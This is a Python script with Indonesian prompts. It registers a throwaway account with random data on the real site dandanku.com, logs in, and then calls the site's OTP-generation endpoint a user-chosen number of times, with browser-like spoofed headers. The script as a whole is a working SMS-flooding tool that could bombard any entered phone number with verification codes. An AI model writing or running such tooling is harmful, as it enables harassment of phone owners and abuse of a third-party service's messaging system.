import requests
import random
import string
import json
import time
from datetime import datetime, timedelta


def random_string(length=8):
    """Generate a random string of given length."""
    return ''.join(random.choices(string.ascii_letters, k=length))


def random_date(start_year=1970, end_year=2005):
    """Generate a random date between start_year-01-01 and end_year-12-31."""
    start = datetime(start_year, 1, 1)
    end = datetime(end_year, 12, 31)
    delta = end - start
    random_days = random.randrange(delta.days + 1)
    date = start + timedelta(days=random_days)
    return date.strftime('%Y-%m-%d')


def main():
    # Input phone number
    phone = input("Masukkan nomor HP (contoh: 081234567890): ")

    # Generate random registration password and data
    reg_password = random_string(12)
    reg_payload = {
        "NamaDepan": random_string(),
        "NamaBelakang": random_string(),
        # Fixed gender value 'Laki-laki'
        "Gender": "Laki-laki",
        "Password": reg_password,
        "Phone_Number": phone,
        "TanggalLahir": random_date(),
        "LocationId": random.randint(1, 100),
        "NamaAlamat": random_string(10),
        "Alamat": random_string(20)
    }

    # Common headers
    headers = {
        "access-control-allow-origin": "https://dandanku.com",
        "cache-control": "no-cache, private",
        "connection": "Keep-Alive",
        "content-type": "application/json",
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "origin": "https://dandanku.com",
        "referer": "https://dandanku.com/",
        "sec-ch-ua": '"Microsoft Edge";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
    }

    # --- Registration ---
    reg_body = json.dumps(reg_payload)
    headers["content-length"] = str(len(reg_body))
    print("Registration Payload:", json.dumps(reg_payload, ensure_ascii=False))
    reg_response = requests.post("https://core.dandanku.com/api/register", data=reg_body, headers=headers)
    print(f"Registration Status Code: {reg_response.status_code}")
    print(f"Registration Response: {reg_response.text}\n")

    # --- Login ---
    login_payload = {
        "Phone_Number": phone,
        "Password": reg_password
    }
    login_body = json.dumps(login_payload)
    headers["content-length"] = str(len(login_body))
    print("Login Payload:", json.dumps(login_payload, ensure_ascii=False))
    login_response = requests.post("https://core.dandanku.com/api/login", data=login_body, headers=headers)
    print(f"Login Status Code: {login_response.status_code}")
    print(f"Login Response: {login_response.text}\n")

    # --- OTP Generate ---
    count = int(input("Berapa banyak OTP yang ingin dikirimkan? "))
    otp_payload = {"Phone_Number": phone}
    for i in range(1, count + 1):
        otp_body = json.dumps(otp_payload)
        headers["content-length"] = str(len(otp_body))
        print(f"[{i}/{count}] OTP Generate Payload:", json.dumps(otp_payload, ensure_ascii=False))
        otp_response = requests.post("https://core.dandanku.com/api/otpgenerate", data=otp_body, headers=headers)
        print(f"[{i}/{count}] OTP Status Code: {otp_response.status_code}")
        print(f"[{i}/{count}] OTP Response: {otp_response.text}\n")
        if i < count:
            time.sleep(15)


if __name__ == "__main__":
    main()
